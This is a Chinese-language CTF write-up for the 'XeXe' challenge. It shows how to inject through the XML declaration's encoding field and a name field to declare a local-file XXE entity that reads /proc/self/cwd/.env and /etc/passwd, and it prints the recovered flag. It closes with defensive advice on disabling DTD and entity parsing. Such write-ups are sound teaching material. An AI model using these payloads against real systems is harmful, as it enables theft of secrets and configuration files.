# XeXe

## 题目简述

应用把两个表单字段直接插入 XML 模板：name 进入 name 元素，encoding 进入 XML 声明。encoding 最大长度为 11，随后 lxml 以 load_dtd=True、no_network=True 解析 XML，并返回第一个 name 文本。

题面说明 flag 位于应用的 .env 文件。no_network 只禁止网络实体，不会阻止 file:// 本地实体，因此目标是从 XML 声明位置跳出并注入本地文件 XXE。

## 解题过程

原模板为：

~~~xml
<?xml version="1.0" encoding="{encoding}"?>
<root>
    <name>{name}</name>
</root>
~~~

encoding 若使用常见写法 UTF-8，再拼接注释起始符会超过 11 字符。XML 同样接受 UTF8，因此可以省掉连字符，提交恰好 11 字符：

~~~text
UTF8"?><!--
~~~

模板开头变成：

~~~xml
<?xml version="1.0" encoding="UTF8"?><!--"?>
~~~

多余的声明尾部被注释。随后让 name 先关闭注释，再插入 DTD、外部实体和一个新的 root：

~~~xml
--><!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///proc/self/cwd/.env">
]><root><name>&xxe;
~~~

先读取 /etc/passwd 可以确认本地实体生效；其中的提示也指向“不知道应用绝对路径时使用当前进程目录”。Linux 的 /proc/self/cwd 符号链接正好指向 Flask 工作目录，所以最终实体读取：

~~~text
file:///proc/self/cwd/.env
~~~

解析后的第一个 name 文本展开为 .env 内容，其中包含：

~~~text
shellmates{xx3_XX3_xXE_Xx3_xX3}
~~~

## 方法总结

XML 注入点不只在元素正文；声明中的 encoding、DOCTYPE 和注释边界同样可能改变整份文档语法。本题的关键是用 UTF8 替代 UTF-8 节省一个字符，在严格长度限制内打开注释，再从 name 关闭注释并声明本地实体。no_network 不等于禁用 XXE；安全配置应关闭 DTD 和实体解析，并避免字符串拼接 XML。
